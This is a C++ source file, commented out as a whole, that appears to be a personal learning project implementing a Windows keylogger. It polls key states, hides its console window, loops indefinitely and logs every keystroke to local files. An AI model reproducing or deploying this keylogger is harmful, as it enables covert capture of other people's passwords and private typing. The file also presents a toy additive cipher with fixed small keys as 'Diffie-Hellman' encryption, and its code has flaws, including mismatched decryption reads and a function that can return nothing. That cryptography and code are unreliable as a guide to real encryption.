/*
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <iomanip>
#include <sstream>
#include <map>
#include <thread>

#define PATH_TO_LOG "C:\\Users\\wiesz\\OneDrive\\Desktop\\learning_c\\key_sniffer\\log.txt"
#define PATH_TO_ENCRYPTED "C:\\Users\\wiesz\\OneDrive\\Desktop\\learning_c\\key_sniffer\\encrypted.txt"
#define PATH_TO_SOLUTION "C:\\Users\\wiesz\\OneDrive\\Desktop\\learning_c\\key_sniffer\\solution.txt"
#define DELAY 150
#define GLOBAL_PARAM_P 8200 //arbitrary keys
#define global_param_g 4 //arbitrary keys

class KeyLogger
{
private:
	std::string logWithEdgeCases(int key) {
		std::map<int, std::string> edgeCases = {
			{VK_SPACE, " "},
			{'¾', "."},
			{VK_RETURN, "\n"},
			{VK_SHIFT, "[SHIFT]"},
			{VK_BACK, "\b"},
			{VK_RBUTTON, "[R_CLICK]"},
			{VK_CAPITAL, "[CAPS_LOCK]"},
			{VK_TAB, "\t"},
			{VK_UP, "[UP]"},
			{VK_DOWN, "[DOWN]"},
			{VK_LEFT, "[LEFT]"},
			{VK_RIGHT, "[RIGHT]"},
			{VK_CONTROL, "[CTRL]"},
			{VK_MENU, "[ALT]"}
		};

		auto it = edgeCases.find(key);
		if (it != edgeCases.end()) {
			return it->second;
		}
		else {
			return std::string(1, static_cast<char>(key));
		}
	}

public:
	std::string log() {
		for (int key = 8; key <= 190; key++) //for each kery check the MSB, the largest ascii being 172 for del
		{
			//check if the MSB in the result of the state of the key is 1 using bitwise &
			if (GetAsyncKeyState(key) & 0x8000) {
				std::cout << std::string(1, static_cast<char>(key)) << std::endl;
				// Add a delay to prevent registering multiple key presses too quickly
				std::this_thread::sleep_for(std::chrono::milliseconds(DELAY));
				return logWithEdgeCases(key);
			}
		}
	}

	void saveToFile(std::string data) {
		std::ofstream logFile(PATH_TO_LOG, std::ios::app);
		if (logFile.is_open()) {
			logFile << data;
			logFile.close();
		}
	}
};

enum Mode {
	ENCRYPT,
	DECRYPT
}; 
 
class Encryptor {
private:
	Mode mode;
	long long int publicKeyA = 0;  // Initialize to some default value
	long long int publicKeyB = 0;  // Initialize to some default value
	// notice! a<p, b<p
	const long long int privateKeyA = 49; //arbitrary keys
	const long long int privateKeyB = 11; //arbitrary keys

	void initializePublicKeys() {
		publicKeyA = power(global_param_g, privateKeyA, GLOBAL_PARAM_P);
		publicKeyB = power(global_param_g, privateKeyB, GLOBAL_PARAM_P);
	}

	int diffieHelman(char& text) {
		// Initialize public keys if not done already
		if (publicKeyA == 0 || publicKeyB == 0) {
			initializePublicKeys();
		}
		std::cout << "encrypting!" << std::endl;
		// create common key
		const long long int x = power(publicKeyB, privateKeyA, GLOBAL_PARAM_P);
		// now you can use the common key x to encrypt your message
		// convert text to int t
			//convert to ascii
			int value = text;
			// Pad with leading zeros if needed
			std::ostringstream oss;
			oss << std::setw(3) << std::setfill('0') << text;

			// Convert back to integer
			int paddedInteger = std::stoi(oss.str());
			std::cout << "ascii: " << value << std::endl;
		
		// encrypted text = (t+x) % p
		int incrypted = (value + x) % GLOBAL_PARAM_P;
		std::cout << "incrypted value: " << incrypted << std::endl;
		return incrypted;
	}

	char decrypt(int& incryptedText) {
		// Initialize public keys if not done already
		if (publicKeyA == 0 || publicKeyB == 0) {
			initializePublicKeys();
		}
		std::cout << "decrypting value!" << std::endl;
		// create common key
		const long long int x = power(publicKeyA, privateKeyB, GLOBAL_PARAM_P);

		// now you can use the common key x to decrypt your message
		// decrypted text = (t - x) % p.
		std::cout << "decrypting: "<< incryptedText << std::endl;
		int decrypted = (incryptedText - x) % GLOBAL_PARAM_P;
		std::cout << "ascii: " << decrypted << std::endl;
		// convert text to int it
		char msg = static_cast<int>(decrypted);
		std::cout << "msg: " << msg << std::endl;

		return msg;
	}

	long long int power(long long int g, long long int a, long long int p) {
			if (a == 1) {
				return g % p;  // Base case, calculating using % to prevent overflow
			}
			else {
				return (g % p) * power(g, a - 1, p) % p;  // Recursive case
			}
	}


public:
	void runEncryptor(std::string& str) {
		if (mode == ENCRYPT) {
			std::ofstream cryptedFileWriter;
			cryptedFileWriter.open(PATH_TO_ENCRYPTED, std::ios::app);
			for (char& c : str) {
				int res = diffieHelman(c);
				//append to file
				cryptedFileWriter << res;
			}
			cryptedFileWriter.close();
		}
	}
	void runDecryptor(){
		// Read four digits at a time
		char buffer[5];  // Including null for end of arr
		std::ifstream fileDecryptReader(PATH_TO_ENCRYPTED);
		std::ofstream fileSolutionWriter;
		while (fileDecryptReader.read(buffer, 4)) {
			buffer[4] = '\0';  // Null for end the buffer
			int value = std::stoi(buffer);
			std::cout << "solving " << value << std::endl;
			char c = decrypt(value);
			std::cout << "the char is " << c << std::endl;
			fileSolutionWriter.open(PATH_TO_SOLUTION, std::ios::app);
			fileSolutionWriter << c;
			fileSolutionWriter.close();
		}
	}

	void setMode(const Mode& m) {
		mode = m;
	}
};

int main() {

	KeyLogger logger;
	Encryptor encryptor;

	std::string input = " ";
	std::cout << "notice you need to set the mode. would you like to sniff and encrypt for a minute(e) or decrypt the log file(d)?" << std::endl;
	while(input != "e" && input != "E" && input != "D" && input != "d")
		std::cin >> input;

	//hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	if (input == "e" || input == "E") {
		while (true) {
			std::string data = logger.log();
			std::cout << data;
			logger.saveToFile(data);
			encryptor.setMode(ENCRYPT);
			encryptor.runEncryptor(data);
		}
	} else { 
		encryptor.setMode(DECRYPT); 
		encryptor.runDecryptor();
	}
    return 0;
}
*/